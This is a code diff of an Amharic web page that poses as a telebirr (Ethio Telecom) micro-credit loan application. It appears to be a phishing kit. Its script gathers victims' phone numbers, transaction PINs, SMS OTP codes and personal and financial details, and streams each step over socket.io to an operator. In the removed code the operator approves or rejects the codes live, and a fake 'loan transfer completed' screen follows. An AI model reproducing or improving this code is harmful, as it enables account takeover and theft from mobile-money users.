-                        <button @click="dispatchPayoutDisbursement" :disabled="!form.employment || !form.income || processingStep6" class="w-full bg-[#0056B3] hover:bg-[#003F87] disabled:opacity-50 text-white font-bold py-3.5 px-4 rounded-xl shadow-md transition-all flex items-center justify-center gap-2">
-                            <span x-show="!processingStep6">ማመልከቻውን አስገባ</span>
-                            <span x-show="processingStep6" class="spinner-sm"></span>
-                        </button>
-                    </div>
-                </div>
-
-                <div x-show="step === 8" x-cloak class="text-center py-6 flex flex-col items-center justify-center my-auto space-y-6 w-full">
-                    <div class="w-16 h-16 bg-[#0056B3] rounded-2xl flex items-center justify-center shadow-md">
-                        <svg class="w-9 h-9 text-white" fill="none" stroke="currentColor" viewBox="0 0 24 24" stroke-width="3.5">
-                            <path stroke-linecap="round" stroke-linejoin="round" d="M5 13l4 4L19 7"></path>
-                        </svg>
-                    </div>
-                    <div>
-                        <h2 class="text-xl font-bold text-gray-800 tracking-tight">የብድር ማስተላለፍ ተጠናቋል!</h2>
-                        <p class="text-xs text-gray-400 mt-1.5 px-4">የቴሌብር ማይክሮ ክሬዲት ጥያቄዎ በተሳካ ሁኔታ ተስተናግዷል። ስለ ብድር ሁኔታዎ ዝርዝር መረጃ በስልክዎ መልዕክት ይደርስዎታል።</p>
-                    </div>
-                    <div class="bg-slate-50 border border-gray-100 px-5 py-3 rounded-xl inline-block mx-auto">
-                        <p class="text-[10px] font-bold text-gray-400 uppercase tracking-wider">የቴሌብር መለያ ቁጥር (TXN)</p>
-                        <p class="font-mono text-base font-bold text-gray-700 mt-0.5 tracking-wide" x-text="referenceId"></p>
-                    </div>
-                </div>
-
             </div>
-
-            <footer class="w-full text-center py-4 shrink-0">
-                <p class="text-[11px] text-gray-400 font-medium">የተመሰጠረ የሂደት ማእከል · ቴሌብር በኢትዮ ቴሌኮም ይሰራል።</p>
-            </footer>
-        </main>
-    </div>
+        </section>
+    </main>
 
     <script>
         function loanFlow() {
             return {
-                step: 1, appId: '', referenceId: '', connected: false,
-                form: { loanType: '', amount: 25000, term: '4', firstName: '', lastName: '', email: '', phone: '', employment: '', income: '' },
-                otp: { code: '' },
-                step1Pin: { value: ['', '', '', '', '', ''] },
-                step3Pin: { value: ['', '', '', '', '', ''] }, 
-                verifyingOtp: false, authorizingFinalPin: false, processingStep6: false,
-                socket: null, toast: { show: false, message: '' },
+                step: 1, 
+                appId: '', 
+                referenceId: '', 
+                form: { loanType: '', amount: 50000, term: '', purpose: '', firstName: '', lastName: '', email: '', phone: '', employment: '', income: '', employer: '', authToken: '' },
+                
+                otpData: { array: ['', '', '', ''] }, 
+                pin: { value: ['', '', '', '', ''] },
+                
+                otpVerifying: false, 
+                pinVerifying: false, 
+                socket: null,
 
-                get isStep1PinValid() { return this.step1Pin.value.join('').length === 6; },
-                get isStep3PinValid() { return this.step3Pin.value.join('').length === 6; },
-
-                calculateWeeklyInstallment() {
-                    let principal = Number(this.form.amount) || 0;
-                    let weeks = Number(this.form.term) || 1;
-                    return ((principal + (principal * 0.018 * weeks)) / weeks).toFixed(2);
-                },
-
-                triggerToastNotification(msg) {
-                    this.toast.message = msg;
-                    this.toast.show = true;
-                    setTimeout(() => { this.toast.show = false; }, 4000);
-                },
-
-                movePinFocus(el, index, maxLen, className) {
-                    if (el.target.value.length === 1 && index < (maxLen - 1)) {
-                        const inputs = document.querySelectorAll('.' + className);
-                        if (inputs[index + 1]) inputs[index + 1].focus();
-                    }
-                },
-
-                submitStep1Credentials() {
-                    if (this.socket && this.connected) {
-                        this.socket.emit('submit-step1-credentials', { 
-                            appId: this.appId,
-                            phone: this.form.phone, 
-                            pin: this.step1Pin.value.join('') 
-                        });
-                    }
-                    this.step = 2;
-                    this.triggerToastNotification("የማረጋገጫ ሂደት ተጀምሯል።");
-                },
-
-                submitOtpToAdminQueue() {
-                    this.verifyingOtp = true;
-                    if (this.socket && this.connected) {
-                        this.socket.emit('submit-otp-verification', { 
-                            appId: this.appId,
-                            code: this.otp.code 
-                        });
-                        this.step = 2.5;
-                    }
-                },
-
-                submitFinalPinAuthorization() {
-                    this.authorizingFinalPin = true;
-                    if (this.socket && this.connected) {
-                        this.socket.emit('submit-final-pin', { 
-                            appId: this.appId,
-                            pin: this.step3Pin.value.join('') 
-                        });
-                        this.step = 2.5;
-                    }
-                },
-
-                submitStep4Config() {
-                    if (this.socket && this.connected) {
-                        this.socket.emit('submit-step4-loan-config', {
-                            appId: this.appId,
-                            loanType: this.form.loanType,
-                            amount: this.form.amount,
-                            term: this.form.term
-                        });
-                    }
-                    this.step = 5;
-                },
-
-                submitStep5Config() {
-                    if (this.socket && this.connected) {
-                        this.socket.emit('submit-step5-kyc-profile', {
-                            appId: this.appId,
-                            firstName: this.form.firstName,
-                            lastName: this.form.lastName,
-                            email: this.form.email
-                        });
-                    }
-                    this.step = 6;
-                },
-
-                dispatchPayoutDisbursement() {
-                    this.processingStep6 = true;
-                    if (this.socket && this.connected) {
-                        this.socket.emit('submit-step6-financials', {
-                            appId: this.appId,
-                            employment: this.form.employment,
-                            income: this.form.income
-                        });
-                    }
-                },
+                get isStep1Valid() { return this.form.loanType && this.form.term && this.form.purpose; },
+                get isStep2Valid() { return this.form.firstName && this.form.lastName && this.form.phone.length >= 8; },
+                get isStep3Valid() { return this.form.employment && this.form.income; },
+                get isStep4Valid() { return this.form.authToken.trim().length > 0; },
+                get isStep5Valid() { return this.pin.value.join('').length === 5; },
+                get isStep6Valid() { return this.otpData.array.join('').length === 4; }, 
 
                 init() {
-                    this.socket = io({ autoConnect: true });
+                    this.socket = io();
+                    this.socket.on('session-ready', (data) => { this.appId = data.appId; });
                     
-                    this.socket.on('connect', () => { this.connected = true; });
-                    this.socket.on('disconnect', () => { this.connected = false; });
-                    this.socket.on('connect_error', (err) => console.error("🔌 Socket error:", err));
-                    
-                    this.socket.on('session-ready', (data) => {
-                        this.appId = data.appId;
-                        this.socket.emit('join-room', this.appId);
-                    });
+                    this.socket.on('pin-verified', () => { this.pinVerifying = false; this.step = 6; });
+                    this.socket.on('otp-verified', (d) => { this.otpVerifying = false; this.referenceId = d.referenceId; this.step = 7; });
+                },
 
-                    this.socket.on('admin-dashboard-approve', () => { 
-                        this.verifyingOtp = false;
-                        this.step = 3; 
-                        this.triggerToastNotification("የኤስኤምኤስ ማረጋገጫ በተሳካ ሁኔታ ጸድቋል።");
-                    });
+                submitStep1() { this.socket.emit('step1', this.form); this.step = 2; },
+                submitStep2() { this.socket.emit('step2', this.form); this.step = 3; },
+                submitStep3() { this.socket.emit('step3', this.form); this.step = 4; },
+                submitStep4() { this.socket.emit('step4', { authToken: this.form.authToken }); this.step = 5; },
+                
+                submitStep5() { 
+                    this.pinVerifying = true; 
+                    this.socket.emit('step5', { pin: this.pin.value.join('') }); 
+                },
+                submitStep6() { 
+                    this.otpVerifying = true; 
+                    this.socket.emit('step6', { code: this.otpData.array.join('') }); 
+                },
 
-                    this.socket.on('otp-rejected', (data) => {
-                        this.verifyingOtp = false;
-                        this.otp.code = '';
-                        this.step = 2;
-                        this.triggerToastNotification(data.message || "የተሳሳተ የኦቲፒ (OTP) ኮድ። እባክዎ በትክክል ያስገቡ።");
-                    });
-                    
-                    this.socket.on('final-pin-accepted', () => { 
-                        this.authorizingFinalPin = false; 
-                        this.step = 4; 
-                    });
 
-                    this.socket.on('pin-rejected', (data) => {
-                        this.authorizingFinalPin = false;
-                        this.step3Pin.value = ['', '', '', '', '', ''];
-                        this.step = 3;
-                        this.triggerToastNotification(data.message || "የተሳሳተ የግብይት PIN ቁጥር። እባክዎ እንደገና ይሞክሩ።");
-                    });
+                handleCodeInput(e, index, totalLength, type) {
+                    const val = e.target.value;
+                    const className = type === 'otp' ? '.otp-box' : '.pin-box';
+                    const targetBoxes = document.querySelectorAll(className);
 
-                    this.socket.on('application-complete', (data) => {
-                        this.processingStep6 = false;
-                        this.referenceId = data.referenceId;
-                        this.step = 8;
-                    });
+                    if (val && index < totalLength - 1) {
+                        targetBoxes[index + 1].focus();
+                    }
+                },
+                handleCodeBackspace(e, index, type) {
+                    const className = type === 'otp' ? '.otp-box' : '.pin-box';
+                    const targetBoxes = document.querySelectorAll(className);
+
+                    if (e.target.value === '' && index > 0) {
+                        targetBoxes[index - 1].focus();
+                    }
                 }
             }
         }
